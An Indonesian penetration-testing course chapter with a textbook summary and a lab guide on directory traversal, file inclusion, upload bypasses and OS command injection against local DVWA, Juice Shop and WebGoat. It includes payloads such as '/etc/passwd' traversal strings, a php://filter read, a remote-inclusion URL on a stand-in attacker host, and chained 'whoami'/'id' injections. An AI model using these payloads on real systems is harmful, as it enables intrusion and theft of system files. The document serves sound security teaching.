# Daftar Isi

- [Isi Paket](#isi-paket)
- [Ringkasan Textbook](#ringkasan-textbook)
- [Step by Step dan Link Youtube - Eksploitasi Kerentanan Web Klasik](#step-by-step-dan-link-youtube---eksploitasi-kerentanan-web-klasik)
- [Resource Praktikum](#resource-praktikum)

# Isi Paket

- **`Bab_06_Ringkasan_Textbook_Kerentanan_Web_Klasik.md`** — OWASP Top 10 sebagai peta besar, absolute vs relative path, directory traversal + bypass encoding (URL encoding, double encoding, null byte), LFI/RFI + PHP wrapper (`php://filter`), file upload vulnerabilities (executable & non-executable/polyglot), OS command injection + blind detection (time-based), dan cara berpikir menggabungkan kerentanan kecil jadi exploit chain.
- **`Bab_06_Modul_Praktikum_Eksploitasi_Web_Klasik.md`** — praktikum bertahap di **DVWA** (naik level low→medium→high), **Juice Shop**, dan **WebGoat**, mencakup keempat kategori kerentanan di atas.
- **`resources/`**:
    - `docker-compose.yml` — Juice Shop + DVWA + WebGoat sekaligus.
    - `Vagrantfile` + `provision.sh` — Kali dengan Burp Suite, curl, Docker.
    - `payloads/webshell_poc.php` — PoC upload yang **sengaja saya buat harmless** (cuma menampilkan info PHP, tanpa fungsi `system`/`exec`) supaya tetap fokus pada pembuktian bypass validasi, bukan bikin backdoor fungsional.
    - `payloads/traversal_payloads.txt` — daftar payload traversal/LFI siap pakai dengan variasi encoding.
    - `test_traversal.sh` — script bantu uji payload berurutan otomatis.
    - `template_bukti_eksploitasi.md` — template dokumentasi lengkap 4 kategori kerentanan.
    - `README.md` — panduan step-by-step plus catatan etika.


# Ringkasan Textbook

Sekarang saatnya kita mulai "menyerang" beneran. Semua fondasi di Bab 5 — proxy intersep, content discovery, pemahaman HTTP — sekarang akan benar-benar terpakai untuk hal yang lebih konkret: menemukan dan membuktikan kerentanan sungguhan.
Sebelum masuk detail teknis, saya ingin kamu kenalan dulu sama satu "peta besar" yang bakal terus muncul sepanjang sisa buku ini.

## 6.1 OWASP Top 10: Peta Kerentanan yang Wajib Kamu Hafal Luar Kepala

**OWASP Top 10** adalah daftar sepuluh kategori risiko keamanan aplikasi web paling umum, disusun berdasarkan data nyata dari ribuan aplikasi yang diuji di seluruh dunia. Ini bukan daftar yang dibuat asal tebak — di balik tiap kategori ada riset mendalam soal seberapa sering kerentanan itu muncul dan seberapa besar dampaknya.

Versi 2021 (yang jadi acuan paling relevan sampai sekarang) terdiri dari: **Broken Access Control**, **Cryptographic Failures**, **Injection**, **Insecure Design**, **Security Misconfiguration**, **Vulnerable and Outdated Components**, **Identification and Authentication Failures**, **Software and Data Integrity Failures**, **Security Logging and Monitoring Failures**, dan **Server-Side Request Forgery (SSRF)**.

Kenapa saya bilang ini "peta besar"? Karena hampir semua kerentanan spesifik yang akan kita bahas — mulai bab ini sampai Bab 9 nanti — sebenarnya adalah manifestasi konkret dari kategori-kategori besar ini. Directory traversal dan IDOR misalnya, keduanya masuk kategori Broken Access Control. SQL Injection dan Command Injection sama-sama masuk kategori Injection. Memahami hierarki ini bikin kamu nggak cuma hafal "trik-trik" satu-satu, tapi paham pola pikirnya.

## 6.2 Absolute vs Relative Path, dan Kenapa Ini Jadi Awal Mula Directory Traversal

Sebelum bahas traversal, kamu perlu paham dulu konsep path di sistem file.

**Absolute path** menunjuk lokasi file dari root sistem, contoh `/etc/passwd` di Linux atau `C:\Windows\System32\config\SAM` di Windows — nggak peduli dari direktori mana kamu berada, path ini selalu menunjuk ke lokasi yang sama persis.

**Relative path** menunjuk lokasi relatif terhadap direktori kamu berada saat ini. Notasi `../` (baca: "naik satu direktori ke atas") adalah kunci dari seluruh teknik directory traversal. Kalau sebuah aplikasi web mengambil input user untuk menentukan file mana yang mau dibuka — misalnya lewat parameter seperti `?file=laporan.pdf` — dan nggak melakukan validasi/sanitasi yang benar, penyerang bisa mengganti input tersebut jadi `?file=../../../../etc/passwd` untuk "naik" keluar dari direktori yang seharusnya diakses, sampai ke file sistem yang sensitif.

## 6.3 Directory Traversal: Identifikasi dan Eksploitasi

Cara paling gampang mengidentifikasi potensi directory traversal: cari parameter yang kelihatannya berhubungan dengan nama file (`file`, `path`, `page`, `document`, `download`, dan semacamnya). Begitu kamu temukan kandidat, coba payload sederhana dulu:

```
?file=../../../../etc/passwd
```

Kalau aplikasi merespons dengan menampilkan isi file `/etc/passwd` (yang formatnya cukup dikenali: baris-baris berisi username, UID, GID, home directory), berarti kamu sudah berhasil membuktikan kerentanan ini.

Tapi jangan berhenti kalau payload sederhana gagal — banyak aplikasi melakukan filter dasar terhadap string `../`. Di sinilah **encoding karakter** jadi penting.

## 6.4 Bypass Filter Lewat Encoding

Filter yang cuma mencari string literal `../` bisa dikelabui dengan berbagai teknik encoding:

- **URL encoding**: `../` menjadi `%2e%2e%2f`
- **Double URL encoding**: kadang filter melakukan decode sekali sebelum validasi, tapi web server melakukan decode lagi setelahnya — jadi `%252e%252e%252f` (yang setelah satu kali decode menjadi `%2e%2e%2f`, lalu setelah decode kedua kali oleh server jadi `../`) bisa melewati filter yang cuma mengecek sekali.
- **Null byte injection** (`%00`) — teknik lawas yang memanfaatkan bug di beberapa bahasa pemrograman versi lama di mana null byte dianggap sebagai akhir string, sehingga bisa "memotong" ekstensi validasi yang ditempelkan aplikasi di akhir path.

Ini prinsip penting yang akan terus berulang di bab-bab selanjutnya: **validasi input yang cuma mengecek pola string secara naif hampir selalu bisa dilewati dengan variasi encoding**. Developer yang baik memvalidasi berdasarkan whitelist yang ketat, bukan cuma blacklist pola tertentu.

## 6.5 File Inclusion: Ketika Traversal Bertemu Eksekusi Kode

Directory traversal "biasa" cuma membiarkan kamu **membaca** file. Tapi ada kategori kerentanan yang lebih berbahaya lagi: **File Inclusion**, di mana aplikasi tidak cuma membaca file sebagai teks, tapi benar-benar **menjalankan/menginterpretasikan** isi file tersebut sebagai kode.

**Local File Inclusion (LFI)** terjadi ketika aplikasi (biasanya PHP) menggunakan fungsi seperti `include()` atau `require()` dengan input yang dikontrol user tanpa validasi ketat. Dampaknya bisa jauh lebih parah dari sekadar baca file — kalau kamu bisa memasukkan file yang isinya kode PHP (bahkan lewat trik seperti log poisoning, di mana kamu "menanam" kode PHP ke dalam log server lewat User-Agent header, lalu meng-include file log tersebut), kamu bisa mencapai **Remote Code Execution**.

**PHP Wrapper** adalah fitur PHP yang memungkinkan akses ke berbagai "stream" data dengan cara khusus. `php://filter` misalnya, memungkinkan kamu membaca source code file PHP (bukan hasil eksekusinya) dengan encoding base64 — sangat berguna kalau kamu cuma bisa include tapi ingin melihat source code asli tanpa dieksekusi (yang biasanya bikin error karena bukan kode yang valid untuk dieksekusi langsung sebagai halaman).

**Remote File Inclusion (RFI)** adalah level yang lebih agresif — bukan cuma include file lokal, tapi meng-include file dari server lain sepenuhnya (misalnya `?page=http://server-attacker.com/shell.txt`). Ini butuh konfigurasi PHP tertentu yang mengizinkan (`allow_url_include`), yang untungnya sudah dinonaktifkan secara default di instalasi PHP modern — tapi tetap penting dipahami karena masih banyak sistem lawas yang belum diupdate.

## 6.6 File Upload Vulnerabilities: Ketika "Fitur" Jadi Pintu Masuk

Hampir semua aplikasi web modern punya fitur upload file — foto profil, dokumen, lampiran. Fitur legit ini, kalau tidak divalidasi dengan benar, jadi salah satu jalur paling langsung menuju Remote Code Execution.

**Menggunakan file executable**: kalau aplikasi cuma mengecek ekstensi file tanpa validasi konten sungguhan, kamu bisa upload file `.php` (atau `.jsp`, `.asp`, tergantung stack backend-nya) yang berisi web shell — kode yang begitu diakses lewat browser, memberimu kemampuan menjalankan command di server. Beberapa teknik bypass validasi ekstensi yang klasik: mengganti ekstensi jadi variasi case (`.PHP`, `.pHp`), menambah ekstensi ganda (`.php.jpg` — tergantung konfigurasi server, kadang tetap dieksekusi sebagai PHP), atau memanfaatkan ekstensi alternatif yang kadang masih dieksekusi web server tapi luput dari blacklist (`.phtml`, `.php5`).

**Menggunakan file non-executable**: bahkan kalau aplikasi berhasil mencegah upload file executable, file "aman" seperti gambar atau SVG masih bisa jadi vektor serangan. SVG misalnya, adalah format berbasis XML yang bisa menyisipkan JavaScript — kalau file ini ditampilkan langsung di browser tanpa sanitasi, bisa memicu Cross-Site Scripting (dibahas lebih lanjut nanti). Teknik lain adalah **polyglot file** — file yang secara valid dianggap dua format sekaligus (misalnya gambar JPEG yang juga valid sebagai file PHP), memanfaatkan celah di cara server memvalidasi jenis file (biasanya cuma mengecek beberapa byte pertama/"magic byte", bukan keseluruhan struktur file).

## 6.7 OS Command Injection: Ketika Aplikasi "Curhat" ke Sistem Operasi

Beberapa aplikasi web perlu menjalankan command sistem operasi di baliknya — misalnya fitur "ping" untuk cek konektivitas, atau fitur convert file yang memanggil tool command-line eksternal. Kalau input user dimasukkan langsung ke command tersebut tanpa sanitasi, penyerang bisa "menumpangi" command tambahan.

Payload paling dasar memanfaatkan **command chaining operator**: `;` (jalankan command berikutnya terlepas dari hasil command pertama), `&&` (jalankan command berikutnya hanya jika command pertama sukses), atau `|` (pipe output command pertama sebagai input command kedua, tapi sering juga dipakai sekadar untuk menjalankan command tambahan).

Contoh konsep: kalau ada fitur ping yang menerima input IP dan menjalankannya sebagai `ping <input-user>`, dan input tersebut nggak divalidasi, memasukkan `127.0.0.1; whoami` bisa membuat server menjalankan command `whoami` tambahan setelah command ping selesai.

**Blind command injection** terjadi ketika output command tidak langsung ditampilkan ke response — kamu nggak bisa lihat hasilnya secara langsung. Di sini teknik seperti time-based detection jadi berguna: masukkan payload yang memicu delay (misalnya `; sleep 10`), lalu amati apakah response memang tertunda 10 detik — kalau iya, itu bukti kuat bahwa command injection berhasil dieksekusi meski hasilnya tidak terlihat.

## 6.8 Menggabungkan Kerentanan Kecil Jadi Exploit Chain

Ini pelajaran penting yang sering luput dari pemula: kerentanan "kecil" yang berdiri sendiri kadang kelihatan tidak terlalu berbahaya, tapi begitu digabung dengan kerentanan lain, dampaknya bisa jadi jauh lebih besar. Contoh klasik: LFI "cuma" memungkinkan baca file secara terpisah nggak terlalu berbahaya, tapi begitu dikombinasikan dengan kemampuan menanam konten (misalnya lewat log poisoning atau upload file yang gagal divalidasi sepenuhnya), kombinasi keduanya bisa berujung Remote Code Execution penuh.

Kebiasaan berpikir seperti ini — selalu bertanya "apa yang bisa saya capai kalau kerentanan ini saya gabung dengan temuan lain?" — adalah salah satu yang membedakan pentester berpengalaman dari yang baru belajar.

## Rangkuman Bab

- OWASP Top 10 adalah peta besar yang membantu kamu memahami pola, bukan cuma hafal trik satu-satu.
- Directory traversal berakar dari pemahaman absolute vs relative path, dan sering bisa di-bypass lewat variasi encoding.
- File Inclusion (LFI/RFI) mengubah "sekadar baca file" jadi potensi eksekusi kode, apalagi dikombinasikan teknik seperti log poisoning.
- File upload vulnerabilities bisa dieksploitasi lewat file executable maupun non-executable (SVG, polyglot file).
- OS Command Injection memanfaatkan operator chaining shell; blind command injection butuh teknik deteksi seperti time-based delay.
- Kerentanan kecil yang digabungkan bisa menghasilkan dampak jauh lebih besar dari masing-masing secara terpisah.

## Checkpoint Mandiri

1. Bisakah kamu menjelaskan kenapa validasi ekstensi file saja tidak pernah cukup untuk mencegah upload berbahaya?
2. Kenapa `php://filter` berguna secara spesifik untuk skenario LFI (dibanding sekadar include file biasa)?
3. Bagaimana cara kamu membuktikan command injection berhasil kalau outputnya tidak pernah ditampilkan langsung ke response?

## Tantangan Mastery

Selesaikan minimal 5 tantangan bertema Broken Access Control dan file handling di **OWASP Juice Shop**, ditambah modul-modul terkait (path traversal, file upload, command injection) di **DVWA level medium hingga high**, **tanpa membuka walkthrough manapun**. Untuk setiap tantangan yang berhasil, catat payload persis yang kamu gunakan dan jelaskan dengan kata-katamu sendiri kenapa payload itu berhasil.

## Sumber Bacaan Lanjutan

- OWASP Top 10:2021 resmi: https://owasp.org/Top10/
- PortSwigger Web Security Academy, topik "Path traversal", "File upload vulnerabilities", "OS command injection": https://portswigger.net/web-security
- OWASP Cheat Sheet — File Upload: https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html

# Step by Step dan Link Youtube - Eksploitasi Kerentanan Web Klasik

Sekarang giliran tangan kamu yang kotor beneran. Target praktikum bab ini menggabungkan tiga aplikasi latihan yang sudah kita kenal: **Juice Shop**, **DVWA**, dan **WebGoat** — masing-masing kita manfaatkan untuk kategori kerentanan yang paling cocok diajarkan olehnya.

## 6.1 Menjalankan Target

```bash
docker compose up -d
```

Ini akan menjalankan Juice Shop (`:3000`), DVWA (`:8081`), dan WebGoat (`:8082/WebGoat`) sekaligus.

Untuk DVWA, jangan lupa: buka halaman awal, klik "Create / Reset Database", login `admin`/`password`, lalu **atur DVWA Security Level ke "low" dulu** di menu "DVWA Security" (kita naikkan levelnya bertahap seiring latihan).

## 6.2 Directory Traversal

**Target: DVWA — modul "File Inclusion"**

1. Set security level ke "low".
2. Buka modul File Inclusion, perhatikan parameter di URL (biasanya `?page=`).
3. Coba payload traversal dasar:
   ```
   ?page=../../../../../../etc/passwd
   ```
4. Kalau berhasil, naikkan security level ke "medium", ulangi — perhatikan filter apa yang mulai menghalangi, lalu coba teknik encoding dari textbook untuk bypass.

Catat setiap payload yang berhasil maupun gagal di `01-traversal-lfi.md`.

## 6.3 Local & Remote File Inclusion

**Target: DVWA — modul "File Inclusion" (lanjutan) dan Juice Shop**

1. Coba akses source code PHP lewat `php://filter`:
   ```
   ?page=php://filter/convert.base64-encode/resource=include.php
   ```
   (Sesuaikan nama file target dengan struktur DVWA — cek dulu file apa saja yang mungkin di-include berdasarkan observasi kamu.)
2. Decode hasil base64 yang didapat untuk melihat source code aslinya.
3. Di Juice Shop, cari tantangan terkait akses file yang seharusnya tidak publik (gunakan skor tantangan bawaan Juice Shop sebagai panduan kategori, tapi jangan buka solusinya).

## 6.4 File Upload Vulnerabilities

**Target: DVWA — modul "File Upload" dan WebGoat modul terkait upload**

1. Set security level DVWA ke "low", coba upload file `.php` sederhana berisi:
   ```php
   <?php echo "Bukti PoC berhasil: " . php_uname(); ?>
   ```
2. Akses file yang berhasil di-upload lewat browser, lihat apakah kode di atas benar-benar tereksekusi.
3. Naikkan security level, ulangi — perhatikan validasi apa yang mulai menghalangi (ekstensi? Content-Type? magic byte?), lalu coba teknik bypass yang relevan dari textbook.
4. Di WebGoat, cari modul terkait "Insecure File Upload" dan selesaikan tantangannya mengikuti hint bawaan WebGoat (WebGoat memang dirancang untuk memberi hint bertahap, jadi ini beda dengan Juice Shop yang lebih "tersembunyi").

## 6.5 OS Command Injection

**Target: DVWA — modul "Command Injection"**

1. Set security level ke "low". Modul ini biasanya berupa fitur "ping" sederhana.
2. Masukkan IP normal dulu (`127.0.0.1`) untuk lihat perilaku normal.
3. Coba payload chaining:
   ```
   127.0.0.1; whoami
   127.0.0.1 && id
   ```
4. Naikkan security level bertahap, amati filter yang mulai aktif, dan sesuaikan payload (misalnya karakter spasi mungkin difilter — coba `${IFS}` sebagai pengganti spasi di shell Linux).
5. Kalau kamu ingin latihan blind command injection, cari command yang tidak menampilkan output langsung, lalu gunakan teknik time-based (`; sleep 5`) dan amati delay response.

## 6.6 Mendokumentasikan Seluruh Temuan

Pindahkan seluruh payload yang berhasil (dan yang gagal beserta analisis kenapa gagal) ke `template_bukti_eksploitasi.md`. Ingat prinsip dari Bab 1: dokumentasi yang baik harus bisa direproduksi orang lain (atau kamu sendiri, enam bulan kemudian).

## Checkpoint Praktikum

- [ ] Berhasil membuktikan directory traversal di DVWA level low, dan mencoba bypass di level medium.
- [ ] Berhasil membaca source code lewat `php://filter`.
- [ ] Berhasil upload dan eksekusi web shell PHP sederhana di DVWA level low.
- [ ] Mencoba minimal 1 teknik bypass validasi upload di level yang lebih tinggi.
- [ ] Berhasil membuktikan OS command injection lewat chaining operator.
- [ ] Mencoba teknik blind command injection dengan time-based detection.
- [ ] Seluruh payload terdokumentasi lengkap di `template_bukti_eksploitasi.md`.

## Sumber Daya Pendukung

Semua file teknis — `docker-compose.yml` (Juice Shop + DVWA + WebGoat), provisioning Vagrant untuk Kali, script pembantu untuk membuat web shell PoC sederhana, dan template dokumentasi bukti eksploitasi — ada di paket resource yang menyertai modul ini.

> **Pengingat etika**: web shell dan teknik command injection di modul ini HANYA untuk dipraktikkan di lab lokal terisolasi (DVWA/WebGoat/Juice Shop di laptop kamu sendiri). Jangan pernah mencoba teknik ini terhadap sistem yang bukan milikmu atau tanpa izin eksplisit.


## Tutorial / Step-by-Step-

https://youtu.be/lxp8nriZ7Gk


# Resource Praktikum

| File/Folder | Fungsi |
|---|---|
| `docker-compose.yml` | Menjalankan Juice Shop + DVWA + WebGoat |
| `Vagrantfile` | Provisioning VM Kali attacker |
| `provision.sh` | Instalasi curl, Burp Suite, Docker |
| `payloads/webshell_poc.php` | PoC harmless untuk latihan file upload (tanpa fungsi command execution) |
| `payloads/traversal_payloads.txt` | Daftar payload directory traversal & LFI siap pakai |
| `test_traversal.sh` | Script pembantu uji coba payload traversal berurutan |
| `template_bukti_eksploitasi.md` | Template dokumentasi bukti eksploitasi |

## Langkah 1 — Setup Kali Attacker

```bash
vagrant up
vagrant ssh
```

## Langkah 2 — Jalankan Target

```bash
docker compose up -d
```

- Juice Shop: `http://localhost:3000`
- DVWA: `http://localhost:8081` (klik "Create/Reset Database", login `admin`/`password`)
- WebGoat: `http://localhost:8082/WebGoat`

**Penting untuk DVWA**: masuk ke menu "DVWA Security", set level ke **low** dulu sebelum mulai latihan. Naikkan bertahap ke medium/high sesuai instruksi di modul praktikum.

## Langkah 3 — Directory Traversal & LFI

Gunakan daftar payload di `payloads/traversal_payloads.txt` sebagai referensi, atau otomasi sebagian dengan:

```bash
chmod +x test_traversal.sh
./test_traversal.sh "http://localhost:8081/vulnerabilities/fi/?page="
```

**Catatan**: script ini butuh cookie session hasil login DVWA kamu sendiri — buka Burp Proxy History, cari cookie `PHPSESSID` dan `security` setelah login, lalu edit di dalam script.

## Langkah 4 — File Upload

Gunakan `payloads/webshell_poc.php` sebagai file uji coba di modul "File Upload" DVWA. File ini sengaja dibuat harmless (cuma menampilkan info versi PHP), fokus latihannya adalah **membuktikan validasi upload bisa dilewati**, bukan membangun backdoor fungsional.

## Langkah 5 — OS Command Injection

Ikuti instruksi manual di modul praktikum (`Bab_06_Modul_Praktikum_Eksploitasi_Web_Klasik.md`) — bagian ini lebih interaktif dan butuh observasi langsung terhadap response aplikasi.

## Langkah 6 — Dokumentasikan

```bash
cp template_bukti_eksploitasi.md ~/Lab-Notes/Bab-06-Web-Exploit/02-bukti-eksploitasi.md
```

## Catatan Etika & Keamanan Lab

- Seluruh payload dan file PoC di paket ini **HANYA untuk lingkungan lab lokal terisolasi**.
- `webshell_poc.php` sengaja tidak menyertakan kemampuan eksekusi command sungguhan — kalau kamu ingin bereksperimen lebih jauh untuk pemahaman, lakukan modifikasi sendiri dan pahami betul risikonya, tetap hanya di lab milikmu sendiri.
- Matikan container setelah selesai:
  ```bash
  docker compose down
  ```

